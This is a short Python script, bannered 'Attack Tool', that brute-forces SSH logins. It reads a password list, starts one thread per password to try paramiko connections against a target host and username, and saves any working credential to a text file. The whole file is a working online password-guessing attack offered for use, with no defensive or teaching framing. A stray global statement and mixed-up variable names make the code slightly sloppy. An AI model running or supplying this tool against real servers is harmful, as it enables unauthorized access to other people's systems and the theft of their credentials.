import paramiko
import socket
import time

import pyfiglet
from colorama import init, Fore
import argparse
import threading
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


global password_final


def is_ssh_open(hostname, username, password):
    ssh = paramiko.client.SSHClient()
    # add to know hosts
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{GREEN}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        ssh.close()
    except paramiko.AuthenticationException:
        print(f"[-] Incorrect password for {username}:{password}")
        ssh.close()
    except paramiko.SSHException:
        print(f"{BLUE}[!] retrying with delay...{RESET}")
        time.sleep(5)
        return is_ssh_open(hostname, username, password)
    else:
        # we found password, there is connection
        print(f"{RED}!!!Found Password:!!!\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        # save password to password.txt
        open("passwords.txt", "w").write(f"{user}@{host}:{password}")
        return True



if __name__ == "__main__":

    ascii_banner = pyfiglet.figlet_format("Attack Tool")
    print(ascii_banner)
    print("-" * 50)
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # read the file
    passlist = open(passlist).read().splitlines()
    thrads = list()
    # brute-force
    for password in passlist:
        thrads.append(threading.Thread(target=is_ssh_open, args=(host,user,password)))
    for thread in thrads:
        time.sleep(0.1)
        thread.start()
    for thread in thrads:
        if thread.is_alive():
            thread.join()
